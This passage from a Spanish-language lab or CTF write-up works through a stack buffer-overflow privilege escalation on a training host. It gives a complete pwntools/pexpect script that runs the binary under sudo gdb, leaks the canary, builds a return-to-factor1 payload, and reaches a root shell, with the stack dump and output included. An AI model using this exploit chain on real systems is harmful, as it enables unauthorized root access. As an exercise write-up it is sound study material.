  iVar1 = strcmp(local_58,"carlos\n");
```

Así que haremos un exploit en Python que hará será primero escribir 72 veces una `S`, lo cual llenará el contenido de la variable `local_58`, de 72 bytes, después, arriba se encentrará la variable encargada de verificar que no se exploto un buffer overflow, **local_10**, así que lo que haremos será guardar el valor del canary en tiempo de ejecución y lo escribiremos a continuación para no sobrescribir el valor del canary, después, estaría **rbp** el cual tiene una longitud de 8 bytes, así que escribiremos 8 `A`, y por último llegaríamos al `ret`, donde introduciremos la dirección de la función `factor1()`.
Ahora usaremos un exploit que nos proporciona en la documentacion en el directoio temporal **/tmp**:
```python
cat > /tmp/exploit.py << 'EOF'
import pexpect
import re
import struct
from pwn import *

def atack():

    binary = ELF("/home/pedro/hallx")
    binary_path = "/home/pedro/hallx"
    secure_gdb = "/usr/local/bin/secure_gdb"
    gdb_process = pexpect.spawn(f"sudo {secure_gdb} {binary_path}", timeout=10, maxread=10000, searchwindowsize=100)
    gdb_process.expect("(gdb)")
    gdb_process.sendline("set disassembly-flavor intel") # configurando el formato que usara gbd para desensamblar, en este caso el formato de intel
    gdb_process.expect("(gdb)")
    gdb_process.sendline("set pagination off") # desactivamos la paginacion de gdb y asi evitamos que nos pregunte si continuar cuando la salida es muy extensa
    gdb_process.expect("(gdb)")
    gdb_process.sendline("set style enabled off") # desactivamos los colores en la salida de gdb, ya que esto nos impide grepear para extraer informacion
    gdb_process.expect("(gdb)")
    gdb_process.sendline("break main")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("run")

    # Extraccion de la direccion de factor1
    gdb_process.expect("(gdb)")
    gdb_process.sendline("p factor1")
    gdb_process.expect_exact("(gdb)", timeout=10)
    address_factor1 = gdb_process.before.decode('utf-8')
    match = re.search(r'0x[0-9a-f]+', address_factor1)
    if match:
       address_factor1_str = match.group(0)  # Extraer la dirección en formato hexadecimal
       address_factor1_int = int(address_factor1_str, 16)
       address_factor1_le = p64(address_factor1_int) # direccion de factor1 en formato little-endian lista para el payload
       gdb_process.sendline(" ") # prepara gdb para recibir el siguiente comando!
    else:
       print("No se pudo extraer la dirección de factor1().")
       exit(1)

    # desensamble de la funcion factor2 y obtencion de una direccion de memoria para crear un punto de interrupcion y posteriormente extraer el canary
    gdb_process.expect("(gdb)")
    gdb_process.sendline("disas factor2")
    gdb_process.expect_exact("(gdb)", timeout=10)
    address_factor2 = gdb_process.before.decode('utf-8')
    lines = address_factor2.splitlines()
    memory_addresses = [line.split()[0] for line in lines if '<+' in line]
    if len(memory_addresses) >= 7:
       seventh_memory_address = memory_addresses[6]
       gdb_process.sendline(" ")
       gdb_process.expect("(gdb)")
       gdb_process.sendline(f"break *{seventh_memory_address}")
       gdb_process.expect("(gdb)")
       gdb_process.sendline("continue")
    else:
       print("No hay suficientes direcciones de memoria en la salida")

    # extraccion del canary
    gdb_process.expect("(gdb)")
    gdb_process.sendline("x/1gx $rbp-0x8")
    gdb_process.expect_exact("(gdb)", timeout=10)
    output_canary = gdb_process.before.decode('utf-8')
    canary_value = output_canary.split(':')[1].strip().split()[0]
    output_canary_int = int(canary_value, 16)
    output_canary_le = struct.pack('<Q', output_canary_int) # canary listo en formato little-endian para el payload
    gdb_process.sendline(" ")
    gdb_process.expect("(gdb)")
    
	# Creación de otro punto de interrupción para comprobar la inyeccion del payload
    gdb_process.sendline("disas factor2")
    gdb_process.expect_exact("(gdb)", timeout=10)
    address_breakpoint = gdb_process.before.decode('utf-8')
    lines = address_breakpoint.splitlines()
    memory_addresses_breakpoint = [line.split()[0] for line in lines if '<+' in line]
    if len(memory_addresses_breakpoint) >= 20:
       memory_address_bp = memory_addresses_breakpoint[19]
       gdb_process.sendline(" ")
       gdb_process.expect("(gdb)")
       gdb_process.sendline(f"break *{memory_address_bp}")
       gdb_process.expect("(gdb)")
       gdb_process.sendline("continue")
    else:
       print("No hay suficientes direcciones de memoria en la salida")

    # construccion del payload
    buffer_size = 72 # offset before overwriting the canary
    buffer_fil = b'S' *buffer_size
    padding = b'A' *8 # padding to align the stack
    #rip = b'P' *8

    payload = flat(
    buffer_fil,
    output_canary_le,
    padding,
    address_factor1_le
    )
    # envio del payload
    gdb_process.expect("Introduce tu nombre: ")
    gdb_process.sendline(payload)
    gdb_process.interact()
    gdb_process.send(b"quit")
    gdb_process.close()

if __name__ == '__main__':
    atack() 
EOF
```

Ahora solicitamos los permisos para ejecutarlo:
```bash
echo "Nombre del solicitante: pedro; Fecha:21/05/25; mensaje:Solicitud de Permisos; Breve descripcion:000-0923" | /usr/sbin/exim root@cybersec
```

Ejecutamos el exploit:
```python3
 python3 exploit.py 
[*] '/home/pedro/hallx'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS^@'���c|4AAAAAAAA�rUUUU^@^@

Breakpoint 3, 0x0000555555557659 in factor2 ()
(gdb) 
```

Despues ejecutamos este:
```bash
x/40gx $rsp

0x7fffffffea70: 0x00007ffff79f2760      0x00007ffff78a13e3
0x7fffffffea80: 0x5353535353535353      0x5353535353535353
0x7fffffffea90: 0x5353535353535353      0x5353535353535353
0x7fffffffeaa0: 0x5353535353535353      0x5353535353535353
0x7fffffffeab0: 0x5353535353535353      0x5353535353535353
0x7fffffffeac0: 0x5353535353535353      0x347c63cef0e22700
0x7fffffffead0: 0x4141414141414141      0x00005555555572d8
0x7fffffffeae0: 0x000000000000000a      0x0000000000000000
0x7fffffffeaf0: 0x0000000000000000      0x0000000000000000
0x7fffffffeb00: 0x0000000000000000      0x0000000000000000
0x7fffffffeb10: 0x0000000000000000      0x00007ffff7fe5f70
0x7fffffffeb20: 0x0000000000000000      0x347c63cef0e22700
0x7fffffffeb30: 0x0000000000000001      0x00007ffff784624a
0x7fffffffeb40: 0x00007fffffffec30      0x000055555555775e
0x7fffffffeb50: 0x0000000100000001      0x00007fffffffec48
0x7fffffffeb60: 0x00007fffffffec48      0x943915852c268faa
0x7fffffffeb70: 0x0000000000000000      0x00007fffffffec58
0x7fffffffeb80: 0x0000555555559dc8      0x00007ffff7ffd020
0x7fffffffeb90: 0x6bc6ea7afaa48faa      0x6bc6fa8de8208faa
0x7fffffffeba0: 0x00007fff00000000      0x0000000000000000
(gdb) 
```

Podemos ver que el paylod si ingreso de manera correcta ya que observamos las 72 "S" (0x53) en azul, el canary sería lo que se encuentra en blanco, las 8 "A" sería lo que está en verde y en rojo está la dirección de la función `factor1`; por lo que si ejecutamos `continue` dos veces obtendremos una shell como usuario **root**.
```bash
(gdb) continue
Continuing.
Usuario no autorizado, notificacion enviada al administrador. 
process 5858 is executing new program: /usr/bin/bash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000555555583eb0 in main ()
(gdb) continue
Continuing.
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@cybersec:/tmp# whoami
[Detaching after fork from child process 5969]
root
```

---

## Lecciones Aprendidas
1. Aprendimos a explotar binarios 
2. Aprendimos **bufferOverFlow**